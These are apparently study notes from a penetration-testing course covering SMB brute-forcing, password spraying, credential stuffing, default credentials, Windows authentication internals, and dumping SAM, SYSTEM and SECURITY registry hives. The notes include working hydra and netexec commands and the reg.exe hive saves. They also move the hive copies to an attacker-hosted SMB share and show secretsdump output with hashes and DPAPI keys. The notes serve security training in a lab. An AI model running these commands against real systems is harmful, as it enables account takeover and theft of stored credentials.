### Find the user for the SMB service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.

```shell
hydra -L username.list -P password.list smb://10.129.202.136
# It throws me and error, So I used:
netexec smb 10.129.202.136 -u 2.list -p password.list # It works cassie:12345678910
```

```shell
netexec smb 10.129.202.136 -u "cassie" -p "12345678910" --shares # Important the ""
---
SMB         10.129.202.136  445    WINSRV           [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINSRV) (domain:WINSRV) (signing:False) (SMBv1:None)
SMB         10.129.202.136  445    WINSRV           [+] WINSRV\cassie:12345678910 
SMB         10.129.202.136  445    WINSRV           [*] Enumerated shares
SMB         10.129.202.136  445    WINSRV           Share           Permissions     Remark
SMB         10.129.202.136  445    WINSRV           -----           -----------     ------
SMB         10.129.202.136  445    WINSRV           ADMIN$                          Remote Admin
SMB         10.129.202.136  445    WINSRV           C$                              Default share
SMB         10.129.202.136  445    WINSRV           CASSIE          READ,WRITE      
SMB         10.129.202.136  445    WINSRV           IPC$            READ            Remote IPC


# Conneting via SMB
smbclient -U cassie \\\\10.129.202.136\\CASSIE
get flag.txt
```
# Spraying, Stuffing, and Defaults

## Password spraying

[Password spraying](https://owasp.org/www-community/attacks/Password_Spraying_Attack) is a type of brute-force attack in which an attacker attempts to use a single password across many different user accounts. This technique can be particularly effective in environments where users are initialized with a default or standard password. For example, if it is known that administrators at a particular company commonly use `ChangeMe123!` when setting up new accounts, it would be worthwhile to spray this password across all user accounts to identify any that were not updated.

Depending on the target system, different tools may be used to carry out password spraying attacks. For web applications, [Burp Suite](https://portswigger.net/burp) is a strong option, while for Active Directory environments, tools such as [NetExec](https://github.com/Pennyw0rth/NetExec) or [Kerbrute](https://github.com/ropnop/kerbrute) are commonly used.

```shell
netexec smb 10.100.38.0/24 -u <usernames.list> -p 'ChangeMe123!'
```
## Credential stuffing

[Credential stuffing](https://owasp.org/www-community/attacks/Credential_stuffing) is another type of brute-force attack in which an attacker uses stolen credentials from one service to attempt access on others. Since many users reuse their usernames and passwords across multiple platforms (such as email, social media, and enterprise systems), these attacks are sometimes successful. As with password spraying, credential stuffing can be carried out using a variety of tools, depending on the target system.

For example, if we have a list of `username:password` credentials obtained from a database leak, we can use `hydra` to perform a credential stuffing attack against an SSH service using the following syntax:

```shell
hydra -C user_pass.list ssh://10.100.38.23
```
## Default credentials

Many systems—such as routers, firewalls, and databases—come with `default credentials`. While best practice dictates that administrators change these credentials during setup, they are sometimes left unchanged, posing a serious security risk.

```shell
pip3 install defaultcreds-cheat-sheet
```

Once installed, we can use the `creds` command to search for known default credentials associated with a specific product or vendor.

```shell
creds search linksys
```

In addition to publicly available lists and tools, default credentials can often be found in product documentation, which typically outlines the steps required to set up a service. While some devices and applications prompt the user to set a password during installation, others use a default—often weak—password.

Let's imagine we have identified certain applications in use on a customer's network. After researching the default credentials online, we can combine them into a new list, formatted as `username:password`, and reuse the previously mentioned `hydra` command to attempt access.

Beyond applications, default credentials are also commonly associated with routers. One such list is available [here](https://www.softwaretestinghelp.com/default-router-username-and-password-list/). While it is less likely that router credentials remain unchanged (since these devices are critical to network security), oversights do occur. Routers used in internal testing environments, for example, may be left with default settings and can be exploited to gain further access.

|**Router Brand**|**Default IP Address**|**Default Username**|**Default Password**|
|---|---|---|---|
|3Com|[http://192.168.1.1](http://192.168.1.1/)|admin|Admin|
|Belkin|[http://192.168.2.1](http://192.168.2.1/)|admin|admin|
|BenQ|[http://192.168.1.1](http://192.168.1.1/)|admin|Admin|
|D-Link|[http://192.168.0.1](http://192.168.0.1/)|admin|Admin|
|Digicom|[http://192.168.1.254](http://192.168.1.254/)|admin|Michelangelo|
|Linksys|[http://192.168.1.1](http://192.168.1.1/)|admin|Admin|
|Netgear|[http://192.168.0.1](http://192.168.0.1/)|admin|password|
## Exercise
### Use the credentials provided to log into the target machine and retrieve the MySQL credentials. Submit them as the answer. (Format: <username:<password)

```shell
creds search mysql

mysql -u "superdba" -p
```
# Windows Authentication Process

The [Windows client authentication process](https://docs.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication) involves multiple modules responsible for logon, credential retrieval, and verification. Among the various authentication mechanisms in Windows, Kerberos is one of the most widely used and complex. The [Local Security Authority](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection) (`LSA`) is a protected subsystem that authenticates users, manages local logins, oversees all aspects of local security, and provides services for translating between user names and security identifiers (SIDs).

The security subsystem maintains security policies and user accounts on a computer system. On a Domain Controller, these policies and accounts apply to the entire domain and are stored in Active Directory. Additionally, the LSA subsystem provides services for access control, permission checks, and the generation of security audit messages.
#### Windows authentication process diagram

![Diagram of Windows Authentication Process showing interactions between WinLogon.exe, LogonUI, lsass.exe, and authentication packages like NTLM and Kerberos.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/308/img/Auth_process1.png)
Local interactive logon is handled through the coordination of several components: the logon process ([WinLogon](https://www.microsoftpressstore.com/articles/article.aspx?p=2228450&seqNum=8)), the logon user interface process (`LogonUI`), credential providers, the Local Security Authority Subsystem Service (`LSASS`), one or more authentication packages, and either the Security Accounts Manager (`SAM`) or Active Directory. Authentication packages, in this context, are Dynamic-Link Libraries (DLLs) responsible for performing authentication checks. For example, for non-domain-joined and interactive logins, the `Msv1_0.dll` authentication package is typically used.

`WinLogon` is a trusted system process responsible for managing security-related user interactions, such as:

- Launching `LogonUI` to prompt for credentials at login
- Handling password changes
- Locking and unlocking the workstation

To obtain a user's account name and password, WinLogon relies on credential providers installed on the system. These credential providers are `COM` objects implemented as DLLs.

WinLogon is the only process that intercepts login requests from the keyboard, which are sent via RPC messages from `Win32k.sys`. At logon, it immediately launches the `LogonUI` application to present the graphical user interface. Once the user's credentials are collected by the credential provider, WinLogon passes them to the Local Security Authority Subsystem Service (`LSASS`) to authenticate the user.
#### LSASS

The [Local Security Authority Subsystem Service](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service) (`LSASS`) is comprised of multiple modules and governs all authentication processes. Located at `%SystemRoot%\System32\Lsass.exe` in the file system, it is responsible for enforcing the local security policy, authenticating users, and forwarding security audit logs to the `Event Log`. In essence, LSASS serves as the gatekeeper in Windows-based operating systems. 

| **Packages**   | **Description**                                                                                                                                                                                                                                                |
| -------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Lsasrv.dll`   | The LSA Server service both enforces security policies and acts as the security package manager for the LSA. The LSA contains the Negotiate function, which selects either the NTLM or Kerberos protocol after determining which protocol is to be successful. |
| `Msv1_0.dll`   | Authentication package for local machine logons that don't require custom authentication.                                                                                                                                                                      |
| `Samsrv.dll`   | The Security Accounts Manager (SAM) stores local security accounts, enforces locally stored policies, and supports APIs.                                                                                                                                       |
| `Kerberos.dll` | Security package loaded by the LSA for Kerberos-based authentication on a machine.                                                                                                                                                                             |
| `Netlogon.dll` | Network-based logon service.                                                                                                                                                                                                                                   |
| `Ntdsa.dll`    | Directory System Agent (DSA) that manages the Active Directory database (ntds.dit), processes LDAP queries, and handles replication between domain controllers. Only loaded on Domain Controllers.                                                             |
Each interactive logon session creates a separate instance of the WinLogon service. The [Graphical Identification and Authentication](https://docs.microsoft.com/en-us/windows/win32/secauthn/gina) (`GINA`) architecture is loaded into the process area used by WinLogon, receives and processes the credentials, and invokes the authentication interfaces via the [LSALogonUser](https://docs.microsoft.com/en-us/windows/win32/api/ntsecapi/nf-ntsecapi-lsalogonuser) function.
#### SAM database

The [Security Account Manager](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc756748\(v=ws.10\)?redirectedfrom=MSDN) (`SAM`) is a database file in Windows operating systems that stores user account credentials. It is used to authenticate both local and remote users and uses cryptographic protections to prevent unauthorized access. User passwords are stored as hashes in the registry, typically in the form of either `LM` or `NTLM` hashes. The SAM file is located at `%SystemRoot%\system32\config\SAM` and is mounted under `HKLM\SAM`. Viewing or accessing this file requires `SYSTEM` level privileges.

Windows systems can be assigned to either a workgroup or domain during setup. If the system has been assigned to a workgroup, it handles the SAM database locally and stores all existing users locally in this database. However, if the system has been joined to a domain, the Domain Controller (`DC`) must validate the credentials from the Active Directory database (`ntds.dit`), which is stored in `%SystemRoot%\NTDS\ntds.dit`.

To improve protection against offline cracking of the SAM database, Microsoft introduced a feature in Windows NT 4.0 called `SYSKEY` (`syskey.exe`). When enabled, SYSKEY partially encrypts the SAM file on disk, ensuring that password hashes for all local accounts are encrypted with a system-generated key.
#### Credential Manager

![Diagram of Windows logon process showing interactions between user input, Logon UI, Credential Provider, WinLogon, and Local Security Authority.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/308/img/authn_credman_credprov.png)

Credential Manager is a built-in feature of all Windows operating systems that allows users to store and manage credentials used to access network resources, websites, and applications. These saved credentials are stored per user profile in the user's `Credential Locker`. The credentials are encrypted and stored at the following location:

```shell
C:\Users\[Username]\AppData\Local\Microsoft\[Vault/Credentials]\
```
There are various methods to decrypt credentials saved using Credential Manager. We will practice hands-on with some of these methods in this module.
#### NTDS

It is very common to encounter network environments where Windows systems are joined to a Windows domain. This setup simplifies centralized management, allowing administrators to efficiently oversee all systems within their organization. In such environments, logon requests are sent to Domain Controllers within the same Active Directory forest. Each Domain Controller hosts a file called `NTDS.dit`, which is synchronized across all Domain Controllers, with the exception of [Read-Only Domain Controllers (RODCs)](https://docs.microsoft.com/en-us/windows/win32/ad/rodc-and-active-directory-schema).

`NTDS.dit` is a database file that stores Active Directory data, including but not limited to:

- User accounts (username & password hash)
- Group accounts
- Computer accounts
- Group policy objects
# Attacking SAM, SYSTEM, and SECURITY

With administrative access to a Windows system, we can attempt to quickly dump the files associated with the SAM database, transfer them to our attack host, and begin cracking the hashes offline. Performing this process offline allows us to continue our attacks without having to maintain an active session with the target. Let's walk through this process together using a target host. Feel free to follow along by spawning the target box provided in this section.
## Registry hives

There are three registry hives we can copy if we have local administrative access to a target system, each serving a specific purpose when it comes to dumping and cracking password hashes. A brief description of each is provided in the table below:

| Registry Hive   | Description                                                                                                                                                       |
| --------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `HKLM\SAM`      | Contains password hashes for local user accounts. These hashes can be extracted and cracked to reveal plaintext passwords.                                        |
| `HKLM\SYSTEM`   | Stores the system boot key, which is used to encrypt the SAM database. This key is required to decrypt the hashes.                                                |
| `HKLM\SECURITY` | Contains sensitive information used by the Local Security Authority (LSA), including cached domain credentials (DCC2), cleartext passwords, DPAPI keys, and more. |
#### Using reg.exe to copy registry hives

By launching `cmd.exe` with administrative privileges, we can use `reg.exe` to save copies of the registry hives. Run the following commands:

```shell
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save

The operation completed successfully.
```

If we're only interested in dumping the hashes of local users, we need only `HKLM\SAM` and `HKLM\SYSTEM`. However, it's often useful to save `HKLM\SECURITY` as well, since it can contain cached domain user credentials on domain-joined systems, along with other valuable data. Once these hives are saved offline, we can use various methods to transfer them to our attack host. In this case, we'll use Impacket's [smbserver](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) in combination with some basic CMD commands to move the hive copies to a share hosted on our attacker machine.
#### Creating a share with smbserver

To create the share, we simply run `smbserver.py -smb2support`, specify a name for the share (e.g., `CompData`), and point to the local directory on our attack host where the hive copies will be stored (e.g., `/home/ltnbob/Documents`). The `-smb2support` flag ensures compatibility with newer versions of SMB. If we do not include this flag, newer Windows systems may fail to connect to the share, as SMBv1 is disabled by default due to [numerous severe vulnerabilities](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=smbv1) and publicly available exploits.

```shell
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
```

Once the share is running on our attack host, we can use the `move` command on the Windows target to transfer the hive copies to the share.
#### Moving hive copies to share

```shell
C:\> move sam.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move security.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move system.save \\10.10.15.16\CompData
        1 file(s) moved.
```

We can then confirm that our hive copies were successfully moved to the share by navigating to the shared directory on our attack host and using `ls` to list the files.
## Dumping hashes with secretsdump

One particularly useful tool for dumping hashes offline is Impacket's `secretsdump`. Impacket is included in most modern penetration testing distributions. To check if it is installed on a Linux based system, we can use the `locate` command:

```shell
locate secretsdump
```

Using `secretsdump` is straightforward. We simply run the script with Python and specify each of the hive files we retrieved from the target host.

```shell
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

```shell
# OUTPUT
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x4d8c7cff8a543fbf245a363d2ffce518
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:3dd5a5ef0ed25b8d6add8b2805cce06b:::
defaultuser0:1000:aad3b435b51404eeaad3b435b51404ee:683b72db605d064397cf503802b51857:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
sam:1002:aad3b435b51404eeaad3b435b51404ee:6f8c3f4d3869a10f3b4f0522f537fd33:::
rocky:1003:aad3b435b51404eeaad3b435b51404ee:184ecdda8cf1dd238d438c4aea4d560d:::
ITlocal:1004:aad3b435b51404eeaad3b435b51404ee:f7eb9c06fafaa23c4bcf22ba6781c1e2:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xb1e1744d2dc4403f9fb0420d84c3299ba28f0643
dpapi_userkey:0x7995f82c5de363cc012ca6094d381671506fd362
[*] NL$KM 
 0000   D7 0A F4 B9 1E 3E 77 34  94 8F C4 7D AC 8F 60 69   .....>w4...}..`i
 0010   52 E1 2B 74 FF B2 08 5F  59 FE 32 19 D6 A7 2C F8   R.+t..._Y.2...,.
 0020   E2 A4 80 E0 0F 3D F8 48  44 98 87 E1 C9 CD 4B 28   .....=.HD.....K(
 0030   9B 7B 8B BF 3D 59 DB 90  D8 C7 AB 62 93 30 6A 42   .{..=Y.....b.0jB
NL$KM:d70af4b91e3e7734948fc47dac8f606952e12b74ffb2085f59fe3219d6a72cf8e2a480e00f3df848449887e1c9cd4b289b7b8bbf3d59db90d8c7ab6293306a42
[*] Cleaning up...
```

Here we see that `secretsdump` successfully dumped the `local` SAM hashes, along with data from `hklm\security`, including cached domain logon information and LSA secrets such as the machine and user keys for DPAPI.

Notice that the first step `secretsdump` performs is retrieving the `system bootkey` before proceeding to dump the `local SAM hashes`. This is necessary because the bootkey is used to encrypt and decrypt the SAM database. Without it, the hashes cannot be decrypted — which is why having copies of the relevant registry hives, as discussed earlier, is crucial.

Moving on, notice the following line:

```shell
Dumping local SAM hashes (uid:rid:lmhash:nthash)
```

This tells us how to interpret the output and which hashes we can attempt to crack. Most modern Windows operating systems store passwords as `NT hashes`.

With this in mind, we can copy the NT hashes associated with each user account into a text file and begin cracking passwords. It is helpful to note which hash corresponds to which user to keep track of the results.
## Cracking hashes with Hashcat

Once we have the hashes, we can begin cracking them using [Hashcat](https://hashcat.net/hashcat/). Hashcat supports a wide range of hashing algorithms, as outlined on its website. In this module, we will focus on using Hashcat for specific use cases. This approach will help build your understanding of how and when to use Hashcat effectively, and how to refer to its documentation to identify the appropriate mode and options based on the type of hashes you've captured.